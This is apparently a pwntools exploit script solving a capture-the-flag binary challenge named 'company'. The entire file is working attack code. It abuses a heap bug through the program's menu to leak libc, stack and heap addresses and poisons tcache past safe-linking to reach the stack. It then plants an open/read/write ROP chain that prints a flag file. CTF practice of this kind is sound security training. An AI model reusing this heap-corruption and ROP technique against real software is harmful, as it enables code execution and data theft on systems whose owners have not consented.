from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('./company')
libc = ELF('libc.so.6',checksec=False) 
p = elf.process()
#p = remote('company.chal.crewc.tf',17001)
gdb.attach(p)

def register(idx,name,position,salary):
    p.sendlineafter(b"> ",b"1")
    p.sendlineafter(b": ", f"{idx}".encode())
    p.sendafter(b": ", name)
    p.sendafter(b": ", position)
    p.sendlineafter(b": ", f"{salary}".encode())

def feedback(me, idx, data):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"? ", f"{me}".encode())
    p.sendlineafter(b"? ", f"{idx}".encode())
    p.sendafter(b": ", data)

def fired(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b": ", f"{idx}".encode())

def view(idx):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"? ", f"{idx}".encode())
    p.recvuntil(b"Feedback: ")
    return p.recvline(0)

HR = b"HR".ljust(0x20,b"\0")
fake = p64(0) + p64(0x61) + p64(0)
p.sendafter(b"? ", fake)

register(0, b"X" * 0x20, HR, 0x1337)
register(1, b"X" * 0x20, HR, 0x1337)

feedback(0, 1, b"A" * 0x40 + p64(0x404070))

fired(1)

register(1, b'X' * 0x20, HR, 0x1337)
register(2, b'X' * 0x20, HR, 0x1337)

fired(1)

feedback(0, 2, b'X' * 0x10 + b"HR".ljust(8, b'\0') + p64(0x404020) + b'A' * 0x10 + p64(0x404088 - 64))

stdout = u64(view(0).ljust(8, b'\0'))
libc.address = stdout - libc.sym._IO_2_1_stdout_

info(f"stdout addr {hex(stdout)}")
info(f"libc base {hex(libc.address)}")

register(1, b'X' * 0x20, HR, 0x1337)
fired(2)
feedback(1, 1, b'X' * 0x10 + b"HR".ljust(8, b'\0') + p64(libc.sym.environ) + b'A' * 0x10 + p64(0x404088 - 64))
stack = u64(view(0).ljust(8, b'\0'))

info(f"stack {hex(stack)}")
register(2, b'A' * 0x20, HR, 0x1337)

feedback(2, 2, b'A' * 8)
fired(2)

feedback(1, 1, b'A' * 8)
feedback(1, 1, b'A' * 0x40)

heap = u64(view(1)[0x40:].ljust(8, b'\0')) - 0x1ef0
info(f"heap {hex(heap)}")

register(3, b'B' * 0x20, HR, 0x1337)
register(4, b'B' * 0x20, HR, 0x1337)

feedback(3, 4, b'A' * 0x40 + p64(heap + 0x1ff0))
fired(4)

register(4, b'L' * 0x20, HR, 0x1337)
register(5, b'X' * 0x20, b'HR'.ljust(0x18, b'\0') + p64(0x61), 0x61)
register(6, b'X' * 0x20, b'HR'.ljust(0x18, b'\0') + p64(0x61), 0x61)

fired(6)
fired(4)

rip = stack + 0x160 - 0x2c0 - 8
info(f"rip {hex(rip)}")
feedback(5, 5, b'A' * 0x10 + p64(0) + p64(0x61) + p64((rip ^ ((heap + 0x2010) >> 12) )))
feedback(5, 5, b'A' * 0x10)
pause()
rop = ROP(libc)
rop.call(rop.ret)
rop.call(libc.sym.read, [0, stack - 0x120, 0x400])
feedback(5, 5, b'A' * 0x8 + bytes(rop) )

syscall = next(libc.search(asm('syscall; ret')))
pop_rdi = next(libc.search(asm('pop rdi; ret')))
pop_rsi = next(libc.search(asm('pop rsi; ret')))
pop_rdx = next(libc.search(asm('pop rdx; pop rcx; pop rbx; ret'))) 
pop_rax = next(libc.search(asm('pop rax; ret')))

info(f"syscall {hex(syscall)}")
info(f"rdi {hex(pop_rdi)}")
info(f"rsi {hex(pop_rsi)}")
info(f"rdx {hex(pop_rdx)}")
info(f"rax {hex(pop_rax)}")

payload  = b''
payload += p64(pop_rax) + p64(2)
payload += p64(pop_rdi) + p64(stack - 0x120 + 0x200)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0) + p64(0) + p64(0)
payload += p64(syscall)

#payload += p64(pop_rax) + p64(78)
#payload += p64(pop_rdi) + p64(3)
#payload += p64(pop_rsi) + p64(elf.bss(0x100))
#payload += p64(pop_rdx) + p64(0x400) + p64(0) + p64(0)
#payload += p64(syscall)
payload += p64(pop_rax) + p64(0)
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi) + p64(elf.bss(0x100))
payload += p64(pop_rdx) + p64(0x400) + p64(0) + p64(0)
payload += p64(syscall)

payload += p64(pop_rax) + p64(1)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(elf.bss(0x100))
payload += p64(pop_rdx) + p64(0x400) + p64(0) + p64(0)
payload += p64(syscall)

payload = payload.ljust(0x200, b'\0')
#payload += b'.\0'
payload += b"flag_you_found_this_my_treasure_leaked.txt"
p.send(payload)

p.interactive()
